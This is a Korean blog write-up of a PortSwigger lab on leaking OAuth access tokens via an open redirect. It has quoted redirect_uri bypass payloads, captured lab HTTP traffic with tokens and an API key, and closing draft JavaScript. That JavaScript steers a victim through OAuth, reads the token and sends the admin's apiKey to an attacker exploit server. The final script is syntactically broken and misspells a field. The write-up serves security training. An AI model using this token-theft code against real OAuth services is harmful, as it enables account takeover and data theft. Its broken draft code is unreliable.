---
layout: post
title: "Burp Academy-OAuth 세번째 문제: Leaking authorization codes and access tokens"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth
- 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
- 난이도: PRACTITIONER (보통)


# 취약점 설명 : Stealing OAuth access tokens via an open redirect

```
Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the redirect_uri parameter to understand how it is being validated. For example:

Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:

https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
If you're not familiar with these techniques, we recommend reading our content on how to circumvent common SSRF defences and CORS.

You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:

https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as localhost.evil-user.net.
It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri.
```


# 랩설명: Stealing OAuth access tokens via an open redirect
이번 문제는 오픈 리다이렉트를 이용해서 관리자의 억세스 토큰을 취득, 그 토큰으로 관리자의 API 키를 얻어낸다. 그리고 이 키를 제출하면 문제가 풀린다. 

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note
You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.
```

# 풀이 
이 서버는 [이전 문제]({% post_url 2023-05-01-burp-academy-oauth-3 %})와 비슷하다. 이전문제는 Auth 코드는 얻어내는 문제였다면 이번에는 억세스 토큰을 얻어내는 문제이다. OAuth 서버는 redirect_uri를 검증하지 않으므로 오픈 리다이렉트가 가능할 것으로 생각된다. 

## 로그인 과정 관찰 

소셜 미디어로 로그인을 하려고 할 떄의 OAuth 서버로의 요청이다. redirect_uri가 파라메터로 포함되어 있다. 

```http
GET /auth?client_id=cd6rgm866pm5cuwa0e31m&redirect_uri=https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback&response_type=token&nonce=827317182&scope=openid%20profile%20email HTTP/2
Host: oauth-0aea007504828638856ddd8a0276005c.oauth-server.net
Cookie: _session=sOHbbwVosKh0_cCgeUbII; _session.legacy=sOHbbwVosKh0_cCgeUbII
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

OAuth 서버는 다음과 같은 302 리다이렉트 응답을 돌려준다. URL에 access_token이 포함되어 있는 것을 알 수 있다. 

```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=sOHbbwVosKh0_cCgeUbII; path=/; expires=Mon, 15 May 2023 23:49:12 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=sOHbbwVosKh0_cCgeUbII; path=/; expires=Mon, 15 May 2023 23:49:12 GMT; secure; httponly
Date: Mon, 01 May 2023 23:49:12 GMT
Keep-Alive: timeout=5
Content-Length: 459

Redirecting to <a href="https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.
```

위의 응답의 Location 헤더의 URL을 보면 access_token은 #으로 이어져 있다. 이는 해시를 의미한다.    
해시는 서버로는 전송되지 않는다. 따라서 클라이언트 서버의 억세스 로그에 남지 않는다. 이전 문제와 비교하면  보안이 더 강해졌다고 할 수 있겠다. 

실제로 이후의 클라이언트 어플리케이션으로의 요청을 보면 다음과 같이 되어 있다. 

```http
GET /oauth-callback HTTP/2
Host: 0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Cookie: session=GZzdOuW1rRMYqV2alS3nWbEM92a9fTxr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

위의 요청을 받은 클라이언트 어플리케이션 서버는 다음 응답을 회신한다.    
이 응답이 힌트가 될 것 같다. 이 시점에서는 자바스크립트를 통해 해시값에 접근할 수 있다(브라우저 URL에 해시가 보여지고 있는 상태다). 해시값을 가지고 공격자의 서버로 요청하도록 자바스크립트를 만들면 될 것 같다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 726

<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0aea007504828638856ddd8a0276005c.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

그리고 위의 자바스크립트가 동작하면 다음과 같은 요청/응답이 발생한다.
HTTP 요청이다. 위의 과정에서 얻은 억세스 토큰은 Authorization헤더에 들어가 있다. 

```http
GET /me HTTP/2
Host: oauth-0aea007504828638856ddd8a0276005c.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/
Authorization: Bearer uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU
Content-Type: application/json
Origin: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers


```

응답이다. 여기에 `apiKey`가 들어가 있다. 문제를 풀려면 관리자의 apiKey를 얻어내야 한다. 

```http
HTTP/2 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Mon, 01 May 2023 23:49:26 GMT
Keep-Alive: timeout=5
Content-Length: 132

{"sub":"wiener","apikey":"WEH9KMHqP0qUcIXtQY9Dt2chA4NESpUK","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
```

# 공격 포인트(풀이 방법) 생각하기
문제 풀이 방법을 생각해보자. OAuth서비스에는 오픈 리다이렉트 취약점이 있다. 여기에 exploit서버를 설정하면 OAuth서비스는 이 서버의 URL로 유저(victim)를 리다이렉트시켜줄 것이다. 

exploit서버의 응답은 다음과 같은 일을 해야 한다. 

1. 먼저 victim을 OAuth 서비스로 이동시켜서 인증을 유도하고, access_token과 함께 공격자의 사이트로 리다이렉트시킨다. 

2.  access_token을 가지고 apiKey를 얻어와서 exploit 서버의 특정 URL로 GET 요청을 보내게 한다. 

음.. 1번과 2번의 일을 각각 시키는 엔드포인트가 필요할 것 같다. 그렇지만 exploit서버는 하나의 엔드포인트만 지정할 수 있다... 어떻게 하지? 모르겠다. 답을 보자. 


## exploit서버 준비
클라이언트 어플리케이션 서버의 응답을 활용할 수 있을 것 같다. 
다음과 같이 만들었다. 

일단 기초적인 폼을 테스트해본다. 

```html
<script>
    const oauth_server_url = 'https://oauth-0aea007504828638856ddd8a0276005c.oauth-server.net';
    const exploit_server_url = 'https://exploit-0ae4005a03084c64806d521401e20014.exploit-server.net';
    const client_id = 'lgmtv8sjqiyx3a1b1kokd';
    fetch(`${oauth_server_url}/auth?client_id=${client_id}&redirect_uri=${exploit_server_url}/oauth-callback&response_type=token&nonce=827317182&scope=openid%20profile%20email`,{
        method: 'GET'
    })
</script>

```

```html
<script>
    const oauth_server_url = 'https://oauth-0aea007504828638856ddd8a0276005c.oauth-server.net/';
    const exploit_server_url = '';
    fetch(`${oauth_server_url}/auth?client_id=cd6rgm866pm5cuwa0e31m&redirect_uri=${exploit_server_url}/oauth-callback&response_type=token&nonce=827317182&scope=openid%20profile%20email`,{
        method: 'GET'
    }).then(
        r => 
        const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
        const token = urlSearchParams.get('access_token');
        fetch(`${oauth_server_url}/me`, {
            method: 'GET',
            headers: {
                'Authorization': 'Bearer ' + token,
                'Content-Type': 'application/json'
            }
        }).then(r => r.json())
        .then(j => 
            const apiKey = j.apkiKey;
            fetch(`${exploit_server_url}/api?apiKey=${apiKey}`, {
                method: 'GET',
            })
        )
    )
</script>
```